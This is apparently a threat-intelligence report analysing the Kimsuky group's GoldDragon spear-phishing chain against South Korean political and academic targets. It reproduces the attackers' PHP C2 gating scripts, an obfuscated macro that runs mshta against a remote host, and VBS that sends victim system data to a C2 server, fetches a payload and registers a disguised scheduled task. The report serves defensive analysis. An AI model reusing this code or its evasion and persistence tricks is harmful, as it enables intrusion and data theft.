Like other sophisticated\nadversaries, this group also updates its tools very quickly. In early 2022, we observed this\ngroup was attacking the media and a think-tank in South Korea and reported technical\ndetails to our threat intelligence customer.\n\n\n-----\n\n**_Kimsuky’s GoldDragon cluster infection procedure_**\n\nIn its new attack, the actor initiated the infection chain sending a spear-phishing email\ncontaining a macro-embedded Word document. Various examples of different Word\ndocuments were uncovered, each showing different decoy contents related to geopolitical\nissues on the Korean Peninsula.\n\n**_Contents of decoy_**\n\nThe actor took advantage of the HTML Application file format to infect the victim and\noccasionally used the Hangeul decoy document. After the initial infection, a Visual Basic\nScript was delivered to the victim. In this process, the actor abused a legitimate blog service\nto host a malicious script with an encoded format. The implanted VBS file is capable of\nreporting information about infected machines and downloading additional payloads with an\nencoded format. The final stage is a Windows executable-type malware that is capable of\nstealing information from the victim such as file lists, user keystrokes, and stored web\nbrowser login credentials.\n\nWhile researching Kimsuky’s novel infection chain, grouped as a GoldDragon cluster, we are\nfaced with several limitations:\n\n\n-----\n\nIt s not easy to acquire the next stage payloads during analysis of a multi-stage\ninfection.\nEven if we connect to the C2 server to acquire the payload, it’s hard to get a relevant\nresponse.\nIt’s not easy to figure out the connection between each object.\n\nWhile tracking the Kimsuky group’s endless operations, however, we discovered server-side\nscripts related to the above infection chain. Based on this finding and further enriching it with\ndata from our telemetry, we were able to reconstruct the whole operation methodology of this\ngroup. The Kimsuky group configured multi-stage command and control servers with various\ncommercial hosting services located around the world. We can summarize the whole C2\noperation as follows:\n\n1. The actor sends a spear-phishing email to the potential victim to download additional\n\ndocuments.\n2. If the victim clicks the link, it results in a connection to the first stage C2 server, with an\n\nemail address as parameter.\n3. The first stage C2 server verifies the incoming email address parameter is an expected\n\none and delivers the malicious document if it’s in the target list. The first stage script\nalso forwards the victim’s IP address to the next stage server.\n4. When the fetched document is opened, it connects to the second C2 server.\n5. The corresponding script on the second C2 server checks the IP address forwarded\n\nfrom the first stage server to check it’s an expected request from the same victim.\nUsing this IP validation scheme, the actor verifies whether the incoming request is from\nthe victim or not.\n6. On top of that, the operator relies on several other processes to carefully deliver the\n\nnext payload such as checking OS type and predefined user-agent strings.\n\n\n-----\n\n**_C2 server structure_**\n\n## C2 script (download.php) for malicious document delivery\n\nAs a result of analyzing the server-side script to convey a malicious document, we figured\nout how this actor verifies the request from the client and minimizes exposure of their\npayload. This script works with a specific parameter name from the victim, so we suspect the\nactor delivers a download link to the victim via email or by sending a request using another\ntype of payload.\n\n\n-----\n\n1. It checks the who GET parameter from the victim. The who parameter contains an\n\nemail address without a domain name.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n\nif (isset($_GET['who']) && $_GET['who'] == \"[redacted]\") # Check 'who'\nparameter value\n\n{\n\n$vbs_server = \"weworld59.myartsonline.com\"; # The next stage server\n\n$virus = \"v.doc\";            # Malicious document\n\n$unvirus = \"un.doc\";           # Benign document\n\n$downname = \"CV.DHOM Alexandra Siddall (Korean).doc\"; # Delivered\nfile name\n\n$who = $_GET['who'];\n\n$down = $who . \".txt\";\n\n\n2. If the incoming request contains an expected email address, it saves the date, IP\n\naddress and user-agent to the [who]_downhistory.txt file.\n3. If the user-agent contains Windows, which means the victim is a Windows machine, it\n\ngoes to the next step. Otherwise, it delivers a benign document to the victim.\n4. Next, the script checks whether the connection from the victim is the first request or not\n\nby checking the existence of the [who].txt file.\n5. If the [who].txt file does not exist, it means it’s the first request from the victim, so the\n\nscript forwards the IP address to the other server (VBS server), delivering the malicious\ndocument, saving the victim’s information to the [who].txt including date, IP address\nand user-agent.\n\nNote that the script sends the victim’s IP address to the other server (named “VBS server” by\nthe author). If the victim connects with an appropriate email address and if it’s an initial\nconnection, the C2 script forwards the IP address to the specific servers with /index.php?ip=\nGET request. Sending the appropriate victim IP addresses to the remote server is a very\nimportant process for the operational security of this actor. We’ll look in more detail at how\nthe operator uses this information in the next section.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n\nfunction send_ip($host, $data)\n\n{\n\n$fp = @fsockopen(\"tcp://\".$host, 80, $errno, $errstr, 30);\n\nif (!$fp) {\n\n} else {\n\n$out = \"GET /index.php?ip=\".$data.\" HTTP/1.1\\r\\n\";\n\n$out .= \"Host: \".$host.\"\\r\\n\";\n\n$out .= \"Connection: Close\\r\\n\\r\\n\";\n\nfwrite($fp, $out);\n\nfclose($fp);\n\n}\n\n}\n\n\nLooking at the corresponding script (index.php) of the above IP-delivering GET request,\nhere’s how it works. Once this script receives an IP address in the ip parameter of the HTTP\nrequest, it extracts the victim’s IP address from ip parameter and saves it to the allow.txt file.\nOtherwise, it saves the client information to the error.txt file and redirects the client to\n_mail.google.com in this case. Additionally, the author used various legitimate websites for_\nredirection, such as naver.com, kisa.or.kr, or other popular email services. The allow.txt file,\nwhich contains the appropriate victim’s IP address, is referred by another C2 script to verify\nwhether the incoming request is valid and thus whether or not to deliver the next stage\npayload.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n\nif(isset($_GET['ip'])){\n\n$szfilename = \"allow.txt\";\n\n$pfile = fopen($szfilename,\"ab\");\n\n$res= $_GET['ip'] . \"\\r\\n\" ;\n\nfwrite($pfile,$res);\n\nfclose($pfile);\n\nexit;\n\n}\n\n$szfilename = \"error.txt\";\n\n$pfile = fopen($szfilename,\"ab\");\n\n$res= $date . \"-\" . \"\\r\\n\".$ip . \"\\r\\n\" . $_SERVER['HTTP_USER_AGENT'].\"\\r\\n\";\n\nfwrite($pfile,$res);\n\nfclose($pfile);\n\nheader('Location: https://mail.google.com');\n\n\nAlso, we discovered that both malicious and benign documents are being delivered by this\nscript. The operator maintains a pair of documents, one benign (un.doc) and the other\nmalicious (v.doc), and delivers the appropriate one depending on the result of the victim\nverification step. The contents of decoy documents have various topics including the agenda\nof the “2022 Asian Leadership Conference”, a form of honorarium request and an Australian\ndiplomat’s curriculum vitae. As we can see, the actor uses content the victim could be\ninterested in, such as an event to be held in the near future, a specific request form, and the\nresume of a high-profile individual.\n\n\n-----\n\n**_Decoy documents_**\n\n## Malicious document and method of delivering next stage payload\n\nMalicious documents delivered to the victim contain a macro to fetch the next stage payload.\nThe macro has a simple functionality and, interestingly, it spawns several child Windows\ncommand shells, probably intended for evading behavior-based analysis. Eventually, the\nmacro executes a fetched payload with the mshta.exe process that is designed to execute a\nMicrosoft HTML Application. The following scriptlet is part of a malicious macro in the\ndocument. It contains a remote server address to fetch the next stage payload.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n\ncmd = \"c\" + \"md /\" + \"c c\" + \"md /\" + \"c cm\" + \"d /\" + \"c c\" + \"m\" + \"d /\" + \"c c\" + \"md /\" +\n\"c c\" + \"md /\" + \"c msht\" + \"a.e\" + \"xe hxxp://leehr24.mywebcommunity[.]org/h.php\"\n\nShell cmd, 0\n\nSleep 9000\n\ncmd = \"cm\" + \"d /\" + \"c TAS\" + \"KKI\" + \"LL /\" + \"F /\" + \"IM msh\" + \"ta.e\" + \"xe\"\n\nShell cmd, 0\n\n\nLuckily, we discovered the corresponding C2 script (h.php) from our telemetry. This script\nsaves incoming traffic information to the log.txt file including the date, IP address, user-agent\nand the right-most 20 characters of the IP MD5 hash which is internally called “TID”\n(probably short for “Target ID”). Next, it checks the presence of the allow.txt file that contains\nIP addresses of verified victims. Only if the client’s IP address exists in the allow.txt, is the\nnext stage payload, h.txt, delivered. Otherwise, the script delivers a short Visual Basic Script\nfor terminating the mshta.exe process.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n\n$downfile = \"h.txt\";\n\n$logfile = \"log.txt\";\n\n$allow_file = \"allow.txt\";\n\n$handle = fopen($logfile, \"ab\");\n\nfwrite($handle, $date .\"\\r\\n\" . $ip . \"\\r\\n\" .\n$_SERVER['HTTP_USER_AGENT'].\"\\r\\n\".\"id=\".$TID.\"---------\\r\\n\");\n\nfclose($handle);\n\nif(file_exists($allow_file)){\n\n$fp = fopen($allow_file,\"r\");\n\n$content = fread($fp, filesize($allow_file));\n\nfclose($fp);\n\nif(!stristr($content,$ip )){\n\necho 'Set objShell = CreateObject(\"Wscript.shell\")\n\nobjShell.run \"TASKKILL /F /IM mshta.exe\", 0, False';\n\nexit;\n\n}\n\n}\n\n\n## VBS scripts from VBS Server\n\nAllowing the macro in the malicious Word document to run leads the victim to fetch and\nexecute an HTML Application (.HTA) payload. The fetched HTA file has two main goals:\nreporting the victim information to the C2 server and creating a scheduled task for autoexecution. The Kimsuky group tends to heavily reuse their code in various scripts; for\ninstance, Visual Basic applications in macros, Visual Basic scripts and HTML applications.\n\nThe sent data contains the ProgramFiles folder path, antivirus name, recently opened file list,\nuser name, OS name, OS version, Microsoft office version, .NET framework version, the file\nlist from the Desktop folder, and a list of user-pinned taskbar items. When the script delivers\nthe collected information to the C2 server, it uses /info.php?ki87ujhy= format, the Kimsuky\n\n\n-----\n\ngroup s usual URL format for fingerprinting. Notably, it uses a hard-coded user-agent,\nincluding the intentionally misspelled word Chnome. After looking at the server-side script,\nwe understand why they use Chnome and not Chrome.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n\nProgramFilesFolder = objShell.ExpandEnvironmentStrings(\"%ProgramFiles%\")\n\nProgramFilesx86Folder =\nobjShell.ExpandEnvironmentStrings(\"%ProgramFiles(x86)%\")\n\ndrl = server_url + \"/info.php?ki87ujhy=\" + ProgramFilesx86Folder + \"&rdxvdw=\" +\nProgramFilesFolder\n\n..[redacted]..\n\nPost = \"v=\" + AntiVirusName + \"&r=\" + recentlist + \"&un=\" + UserName + \"&os=\" + os\n+ \"&sv=\" + Version + \"&msv=\" + GetOfficeVersionNumber + \"&dnv=\" + dnv + \"&dll=\" +\ndesktop_lnk + \"&tll=\" + taskbar_lnk\n\nDim WinHttpReq\n\nSet WinHttpReq = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")\n\nWinHttpReq.Open \"POST\", drl, False\n\nWinHttpReq.setRequestHeader \"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64;\nx64) AppleWebKit/537.36 (KHTML, like Gecko) Chnome/97.0.4692.99 Safari/537.36\"\n\nWinHttpReq.setRequestHeader \"Content-Type\", \"application/x-www-form-urlencoded\"\n\nWinHttpReq.setRequestHeader \"Content-Length\", Len(Post)\n\nWinHttpReq.Send Post\n\n\nApart from the reporting capability, the fetched script downloads an additional payload and\nregisters it with a persistence mechanism. This code is also heavily used in other Kimsuky\nscripts and fetches the payload through s.php, saving it to the defs.ini file, registering the file\nas a Windows schedule, with the name “OneDrive Clean” in this case.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n\nSet shell_obj = CreateObject(\"WScript.Shell\")\n\nini_file = shell_obj.expandenvironmentstrings(\"%appdata%\") & \"\\defs.ini\"\n\ndrl = server_url + \"/s.php\"\n\nSet WinHttpReq= CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")\n\nWinHttpReq.Open \"GET\", drl,False\n\nWinHttpReq.setRequestHeader \"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64;\nx64) AppleWebKit/537.36 (KHTML, like Gecko) Chnome/97.0.4692.99 Safari/537.36\"\n\nWinHttpReq.send\n\nIf WinHttpReq.Status=200 Then\n\nSet oFile = CreateObject(\"Scripting.FileSystemObject\")\n\nSet ofp = oFile.CreateTextFile(ini_file, 2)\n\nofp.Write kjhskfjaskdjf(res)\n\nofp.Close\n\nEnd If\n\ncmd1 = \"w\" + \"sc\" + \"ript.e\" + \"xe //\" + \"e:v\" + \"bsc\" + \"ript //b \"\"\"\"\" + ini_file + \"\"\"\"\"\"\n\ncmd2 = \"scht\" + \"asks /cr\" + \"eate /s\" + \"c mi\" + \"nute /mo 30 /tn \"\"OneDrive Clean\"\"\n/tr \"\"\" + cmd1 + \"\"\"\"\n\nshell_obj.run cmd2,0,False\n\n\nDuring our research, we discovered a corresponding C2 script (s.php) for delivering a\npayload for auto-execution. The primary objectives of the delivered VBS payload are\nconnecting to the legitimate blog, parsing the post and finally acquiring the next stage\npayload. Interestingly, this C2 script generates a blog address based on the victim’s IP\naddress. After calculating the MD5 hash of the victim’s IP address, it cuts off the last 20\ncharacters, and turns it into a blog address. The author’s intent here is to operate a\ndedicated fake blog for each victim, thereby decreasing exposure of their malware and\ninfrastructure. Additionally, the script checks whether the user-agent has an uncommon\nstring, chnome. As we mentioned earlier, the Visual Basic Script connects to this C2 script\nusing a hard-coded chnome User-agent name and the script checks the misspelled useragent to verify it’s an expected request from a real victim.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n\n$filename = hash(\"md5\", $ip);\n\n$filename = str_replace(\"+\", \"\", $filename);\n\n$filename = str_replace(\"=\", \"\", $filename);\n\n$filename = str_replace(\"/\", \"\", $filename);\n\n$filename = right($filename, 20);\n\n$logfile = $filename.\".txt\";\n\n$errorfile = \"error.txt\";\n\nif(stristr($_SERVER['HTTP_USER_AGENT'], \"chnome\"))\n\n{\n\n$url = base64_encode(\"https://\" . $filename . \".blogspot.com/2022/04/1.html\");\n\n$spy_script = 'Function hhgtttgffgg(ByVal base64String)\n\nOn Error Resume Next\n\nConst Base64 =\n\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n\nDim dataLength, sOut, groupBegin\n\n\nBased on our findings and analysis above, we list the tricks the actor adopts to hide their\ninfrastructure and make it harder for security researchers and auto-analysis systems to\nacquire payloads:\n\n\n-----\n\n**_Tricks from C2 scripts_**\n\n## Victims\n\nBased on the contents of the decoy document, we hypothesize that the targets of this\noperation are people or entities related to politics or diplomatic activities. Also, historically,\npoliticians, diplomats, journalists, professors, and North Korean defectors have been prime\ntargets of the Kimsuky group. Based on the email address names from the C2 scripts, we\ncan further consolidate this hypothesis. The C2 scripts have only partial email addresses, so\nwe tried to extrapolate the full email address and real owner from within the diplomatic and\nacademic spheres.\n\n\n**Email name** **Suspected email** **Delivered file**\n**name**\n\n\n**Email owner**\n\n\nyk**** yk****@***.ac.kr unknown South Korean university\nprofessor\n\n\nlee**** lee****@gmail.com CV.DHOM\nAlexandra Siddall\n(Korean).doc\n\nchon**** chon****@naver.com CV.DHOM\nAlexandra Siddall\n(Korean).doc\n\nwoo****** Unknown CV.DHOM\nAlexandra Siddall\n(Korean).doc\n\nscc***** scc*****@naver.com CV.DHOM\nAlexandra Siddall\n(Korean).doc\n\nwon*** won***@****.ac.kr CV.DHOM\nAlexandra Siddall\n(Korean).doc\n\nthk***** thk*****@naver.com CV.DHOM\nAlexandra Siddall\n(Korean).doc\n\nkim***** kim*****@gmail.com CV.DHOM\nAlexandra Siddall\n(Korean).doc\n\n\nDirector General of South\nKorean government\norganization\n\nResearcher at Defense\nAnalyses\n\nThink-tank researcher\n\nResearcher of think-tank\n\nSouth Korean university\nprofessor\n\nSouth Korean university\nprofessor\n\nSouth Korean university\nprofessor\n\n\n-----\n\nkim*** Unknown 2022년\nAL(220412).doc\n\nAsian Leadership\nConference\n\njh****** jh******@****.ac.kr [양식]사례비지급\n의뢰서.doc\n\n([Template]Pay\nhonorarium.doc)\n\njung****** jung******@gmail.com [양식]사례비지급\n의뢰서.doc\n\nsung********* sung*********@gmail.com [양식]사례비지급\n의뢰서.doc\n\n## Conclusions\n\n\nProbably former Korean\nAmbassador to the United\nNations\n\nProfessor of South Korea\nuniversity\n\nRepresentative of\nResearch Council for\nNorth Korea\n\nAssistant professor at\nSouth Korean university\n\n\nKimsuky, one of the most prolific and active threat actors on the Korean Peninsula, operates\nseveral clusters and GoldDragon is one of the most frequently used. We’ve seen that the\nKimsuky group continuously evolves its malware infection schemes and adopts novel\ntechniques to hinder analysis. The main difficulty in tracking this group is that it’s tough to\nacquire a full-infection chain. As we can see from this research, threat actors have recently\nadopted victim verification methodology in their command and control servers. Despite the\ndifficulty of obtaining server-side objects, if we analyze an attacker’s server and malware\nfrom the victim’s side, we can get a full understanding of how the threat actors operate their\ninfrastructure and what kind of techniques they employ.\n\n## Indicators of Compromise\n\n### Malicious
